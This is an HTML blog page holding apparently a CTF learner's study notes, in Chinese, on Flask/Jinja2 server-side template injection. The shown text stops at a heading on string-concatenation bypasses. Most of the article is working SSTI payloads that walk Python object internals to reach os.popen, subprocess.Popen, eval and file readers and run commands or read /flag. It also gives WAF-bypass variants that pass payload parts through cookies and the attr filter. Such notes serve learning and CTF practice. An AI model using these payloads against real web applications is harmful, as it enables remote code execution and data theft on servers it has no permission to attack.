@@ -1,0 +1,361 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SSTI | Lengkur</title><meta name="author" content="Lengkur"><meta name="copyright" content="Lengkur"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="## FLASK  123456789101112__class__：查看当前对象所属的类__mro__：查看当前类的继承关系（MethodResolutionOrder），通常用来找基类object__base__：查看当前类的直接父类__subclasses__()：列出当前运行环境下，该类所有的子类，自定义的类也在这里（这是寻找RCE插件的关键）__init__：类的初始化方法，访问构造函">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI">
+<meta property="og:url" content="http://lengkur.github.io/2026/01/24/notes/SSTI/index.html">
+<meta property="og:site_name" content="Lengkur">
+<meta property="og:description" content="## FLASK  123456789101112__class__：查看当前对象所属的类__mro__：查看当前类的继承关系（MethodResolutionOrder），通常用来找基类object__base__：查看当前类的直接父类__subclasses__()：列出当前运行环境下，该类所有的子类，自定义的类也在这里（这是寻找RCE插件的关键）__init__：类的初始化方法，访问构造函">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://lengkur.github.io/img/comeboy2.jpg">
+<meta property="article:published_time" content="2026-01-24T06:52:25.000Z">
+<meta property="article:modified_time" content="2026-01-24T07:28:35.232Z">
+<meta property="article:author" content="Lengkur">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://lengkur.github.io/img/comeboy2.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SSTI",
+  "url": "http://lengkur.github.io/2026/01/24/notes/SSTI/",
+  "image": "http://lengkur.github.io/img/comeboy2.jpg",
+  "datePublished": "2026-01-24T06:52:25.000Z",
+  "dateModified": "2026-01-24T07:28:35.232Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Lengkur",
+      "url": "http://lengkur.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/lengkur.png"><link rel="canonical" href="http://lengkur.github.io/2026/01/24/notes/SSTI/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SSTI',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/imgloaded.css"><link rel="stylesheet" href="/css/meteors.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.8.0/styles/atom-one-dark.min.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box" onclick="document.getElementById('loading-box').style.display='none'"><style>#loading-box {
+  position: fixed;
+  z-index: 1000;
+  width: 100vw;
+  height: 100vh;
+  background: #222;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  transition: opacity 0.5s; /* 增加消失时的淡出过渡 */
+}
+.loader {
+  position: relative;
+  width: 150px;
+  height: 150px;
+  background: transparent;
+  border-radius: 50%;
+  border: 2px solid transparent;
+  border-top-color: #00ffaa;
+  animation: spin 1.5s linear infinite;
+}
+.loader:before {
+  content: "";
+  position: absolute;
+  top: 5px;
+  left: 5px;
+  right: 5px;
+  bottom: 5px;
+  border-radius: 50%;
+  border: 2px solid transparent;
+  border-top-color: #00aaff;
+  animation: spin 3s linear infinite;
+}
+.loader:after {
+  content: "";
+  position: absolute;
+  top: 15px;
+  left: 15px;
+  right: 15px;
+  bottom: 15px;
+  border-radius: 50%;
+  border: 2px solid transparent;
+  border-top-color: #ff00aa;
+  animation: spin 1.5s linear infinite;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+[data-theme='light'] #loading-box {
+  background: #fff;
+}
+</style><div class="loader"></div><script>(function(){
+  const loadingBox = document.getElementById('loading-box');
+  
+  const removeLoading = () => {
+    if (!loadingBox) return;
+    loadingBox.style.opacity = '0';
+    setTimeout(() => {
+      loadingBox.style.display = 'none';
+    }, 500); // 等待0.5s过渡动画结束后彻底隐藏
+  }
+
+  // 1. 监听网页加载完成事件
+  window.addEventListener('load', removeLoading);
+  
+  // 2. 也是为了PJAX适配
+  document.addEventListener('pjax:complete', removeLoading);
+
+  // 3. 兜底机制：万一网络太卡，5秒后强制进入，防止一直卡死
+  setTimeout(removeLoading, 5000);
+})()</script></div><div class="bg-animation" id="web_bg" style="background-color: #000000;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/lengkur.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">70</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> WEB学习经历</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/notes/"><i class="fa-fw fas fa-book"></i><span> 笔记</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-pencil-alt"></i><span> Write Up</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/wp/"><i class="fa-fw fas fa-list-ul"></i><span> 全部文章</span></a></li><li><a class="site-page child" href="/categories/wp/ctfshow/"><i class="fa-fw fas fa-flag"></i><span> ctfshow</span></a></li><li><a class="site-page child" href="/categories/wp/NSSCTF-WEB/"><i class="fa-fw fas fa-skull"></i><span> NSSCTF</span></a></li><li><a class="site-page child" href="/categories/wp/BUUCTF/"><i class="fa-fw fas fa-biohazard"></i><span> BUUCTF</span></a></li><li><a class="site-page child" href="/categories/wp/%E4%B8%89%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/"><i class="fa-fw fas fa-chess-rook"></i><span> CISCN</span></a></li><li><a class="site-page child" href="/categories/wp/DASCTF/"><i class="fa-fw fas fa-shield-alt"></i><span> DASCTF</span></a></li><li><a class="site-page child" href="/categories/wp/furryctf/"><i class="fa-fw fas fa-paw"></i><span> furryctf</span></a></li><li><a class="site-page child" href="/categories/wp/polarctf/"><i class="fa-fw fas fa-snowflake"></i><span> polarctf</span></a></li><li><a class="site-page child" href="/categories/wp/NSS-%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"><i class="fa-fw fas fa-tools"></i><span> NSS工坊</span></a></li><li><a class="site-page child" href="/categories/wp/NSS%E6%98%9F%E8%BE%B0%E5%A4%A7%E6%B5%B7/"><i class="fa-fw fas fa-rocket"></i><span> NSS星辰大海</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-id-badge"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/comeboy2.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Lengkur</span></a><a class="nav-page-title" href="/"><span class="site-name">SSTI</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> WEB学习经历</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/notes/"><i class="fa-fw fas fa-book"></i><span> 笔记</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-pencil-alt"></i><span> Write Up</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/wp/"><i class="fa-fw fas fa-list-ul"></i><span> 全部文章</span></a></li><li><a class="site-page child" href="/categories/wp/ctfshow/"><i class="fa-fw fas fa-flag"></i><span> ctfshow</span></a></li><li><a class="site-page child" href="/categories/wp/NSSCTF-WEB/"><i class="fa-fw fas fa-skull"></i><span> NSSCTF</span></a></li><li><a class="site-page child" href="/categories/wp/BUUCTF/"><i class="fa-fw fas fa-biohazard"></i><span> BUUCTF</span></a></li><li><a class="site-page child" href="/categories/wp/%E4%B8%89%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/"><i class="fa-fw fas fa-chess-rook"></i><span> CISCN</span></a></li><li><a class="site-page child" href="/categories/wp/DASCTF/"><i class="fa-fw fas fa-shield-alt"></i><span> DASCTF</span></a></li><li><a class="site-page child" href="/categories/wp/furryctf/"><i class="fa-fw fas fa-paw"></i><span> furryctf</span></a></li><li><a class="site-page child" href="/categories/wp/polarctf/"><i class="fa-fw fas fa-snowflake"></i><span> polarctf</span></a></li><li><a class="site-page child" href="/categories/wp/NSS-%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"><i class="fa-fw fas fa-tools"></i><span> NSS工坊</span></a></li><li><a class="site-page child" href="/categories/wp/NSS%E6%98%9F%E8%BE%B0%E5%A4%A7%E6%B5%B7/"><i class="fa-fw fas fa-rocket"></i><span> NSS星辰大海</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-id-badge"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SSTI</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-24T06:52:25.000Z" title="发表于 2026-01-24 14:52:25">2026-01-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-24T07:28:35.232Z" title="更新于 2026-01-24 15:28:35">2026-01-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/notes/">notes</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container">
+## FLASK
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">__class__：查看当前对象所属的类<br><br>__mro__：查看当前类的继承关系（MethodResolutionOrder），通常用来找基类object<br><br>__base__：查看当前类的直接父类<br><br>__subclasses__()：列出当前运行环境下，该类所有的子类，自定义的类也在这里（这是寻找RCE插件的关键）<br><br>__init__：类的初始化方法，访问构造函数，函数对象都有__globals__属性<br><br>__globals__：函数所在模块的全局变量字典，获取该函数运行时的所有全局变量、函数和引用的模块（如果这个类所在的文件夹里引用了os，或者它能访问__builtins__，那么os模块就会出现在这个字典里）<br>如果[]被禁__globals__要访问字典键可以：.os，.get(&quot;os&quot;)，|attr(&#x27;os&#x27;)，.__getitem__(&#x27;os&#x27;)，dict，request<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">要是没有什么类,可以用可以找找__builtins__工具，包含了python所有内置函数<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">有__class__属性的有：(),<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>,[],<span class="hljs-built_in">config</span>,request,<span class="hljs-built_in">self</span>,lipsum,cycler,joiner,namespace,url_for,get_flashed_messages<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">分隔符也可以改，开发者自定义</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;&#125;&#125;</span><span class="language-xml">：变量、表达式打印，有回显</span><br><span class="language-xml"></span><br><span class="language-xml">&#123;%%&#125;：语句、控制流，无回显，唯一有个print可以打印像</span><br><span class="language-xml">例：</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> admin <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> ... </span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-name">range</span>(<span class="hljs-number">10</span>) <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> ... </span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a = <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-comment">&#123;##&#125;</span><span class="language-xml">：注释，不会被执行</span><br><span class="language-xml"></span><br><span class="language-xml">#：行语句需要开启配置</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">在jinja2中没有定义的变量值为Undefined对象<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">过滤器(join,attr)没有参数，可以不加括号<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">~：在jinja2中，在~两边的不管是什么都会被转成字符串，将字符连接在一起，如10~2=&gt;&quot;102&quot;,&quot;a&quot;~&quot;b&quot;=&quot;ab&quot;<br></code></pre></td></tr></table></figure>
+
+
+
+#### 常用模块和类
+
+**os模块**
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">这是最直接的目标它通常隐藏在这些子类的__globals__中：<br><br>os._wrap_close(Python3极常用，索引通常在前150个)<br><br>warnings.catch_warnings(经典老牌)<br><br>site._Printer<br><br>linecache(因为它内部为了读取源码引用了os)<br>例：<br>&#123;&#123;().__class__.__bases__[0].__subclasses__()[索引].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;<br>&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+**inspect.Signature**
+
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[290].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat/flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">也有__builtins__</span><br></code></pre></td></tr></table></figure>
+
+**subprocess.Popen**
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">subprocess.Popen(通常直接出现在subclasses列表中)<br><br>例：&#123;&#123;().__class__.__bases__[0].__subclasses__()[索引](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0]&#125;&#125;<br>communicate()会返回一个元组，两个元素标准输出和标准错误<br></code></pre></td></tr></table></figure>
+
+**_frozen_importlib_external.FileLoader**
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">可用于绕过那些过滤了os、popen、eval或open的waf<br>FileLoader是Python内部用来从硬盘加载文件的类它有一个内置方法叫get_data(0,path)，第一个参数是self，get_data不会用到self，所以可以随便传参，但省略会报错<br><br>&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[94][&quot;get_data&quot;](0,&quot;/flag&quot;)&#125;&#125;<br>&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[94].get_data(0,&#x27;/flag&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+**traceback.TracebackException**
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[292].__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls/&#x27;).read()&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+**builtins模块**
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">__builtins__就像一个百宝箱，里面包含了Python所有的内置函数，如eval,__import__,open<br>只要能访问到__globals__机会百分百__builtins__,而能访问__globals__的都是python写的，包括用户自定义的类<br>常用入口类：site.Quitter,site._Printer,warnings.catch_warnings<br><br>利用方式：<br><br>执行eval：__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)<br><br>使用import：__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;ls&#x27;)<br></code></pre></td></tr></table></figure>
+
+**flask.json.tag.JSONTag**
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[446].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+#### 绕过
+
+request对象
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">是flask就有，flask.*<br>&#123;&#123;url_for.__globals__[&#x27;request&#x27;]&#125;&#125;<br>&#123;&#123;get_flashed_messages.__globals__[&#x27;request&#x27;]&#125;&#125;<br>request.args：解析后的URL查询字符串（GET参数）<br>结构：?name=abc&amp;age=18，request.args.name调用<br>&#123;&#x27;name&#x27;:&#x27;abc&#x27;,&#x27;age&#x27;:&#x27;18&#x27;&#125;<br><br>request.form：POST请求中表单提交的数据<br>结构：类似字典<br><br>request.values：args和form的结合体<br><br>request.cookies：客户端发送的所有Cookie<br>SSTI价值：如果URL长度受限，可以将Payload放在Cookie里，通过request.cookies.mykey读取<br><br>request.headers：所有的HTTP请求头<br>结构：包含User-Agent,Referer,Host等<br>SSTI价值：可以用request.headers[&#x27;User-Agent&#x27;]来读取数据<br><br>request.method：请求方法（GET,POST,PUT等）<br><br>request.path：请求的路径（不带域名和参数，如/login）<br><br>request.url：完整的请求地址<br><br>request.host：服务器的主机名（域名）<br><br>request.remote_addr：客户端的真实IP地址<br><br>request.files：上传的文件对象<br><br>request.json：如果请求头是application/json，这里存放解析后的JSON数据<br><br>?name=&#123;&#123;().__class__.__base__.__subclasses__()[94][request.args.m1](0,request.args.m2)&#125;&#125;&amp;m1=get_data&amp;m2=/flag<br></code></pre></td></tr></table></figure>
+
+pop函数
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">__subclasses__()是列表，__init__.__global__是字典都可以使用pop<br>pop会删除并返回指定键的值，通常一次性会导致环境崩溃<br>__subclasses__()[94]和__subclasses__().pop(94)值相等<br></code></pre></td></tr></table></figure>
+
+lipsum函数
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">内置函数有__globals__属性,可以直接lipsum.__globals__<br>拥有模块：os<br><br>&#123;&#123;(lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read()&#125;&#125;<br>cookie：m1=__globals__;m2=cat /flag;m3=os<br>&#123;&#123; (lipsum|attr(request.cookies.n)|attr(request.cookies.k))(&quot;os&quot;).popen(request.cookies.m).read() &#125;&#125;<br>cookie：n=__globals__;k=__getitem__;m=ls<br>&#123;&#123; (lipsum|attr(request.cookies.n))[request.cookies.k].popen(request.cookies.m).read() &#125;&#125;<br>cookie：n=__globals__;k=os;m=ls<br>&#123;&#123;(lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read()&#125;&#125;<br>cookie：m1=__globals__;m2=cat /flag;m3=os<br></code></pre></td></tr></table></figure>
+
+|attr()过滤器
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">可以是字符串也可以是变量<br>lipsum|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;) 等于 lipsum.__init__.__globals__<br><br>&#123;&#123;(lipsum|attr(request.cookies.m1)).os.popen(request.cookies.m2).read()&#125;&#125;<br>Cookie：m1=__globals__;m2=cat /flag<br></code></pre></td></tr></table></figure>
+
+{%%}分隔符
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%print((lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read())%&#125;<br>cookie：m1=__globals__;m2=cat /flag;m3=os<br><br>&#123;% %&#125;中可以写set定义变量，&#123;&#123;&#125;&#125;会报错<br></code></pre></td></tr></table></figure>
+
+字符拼接绕过
+
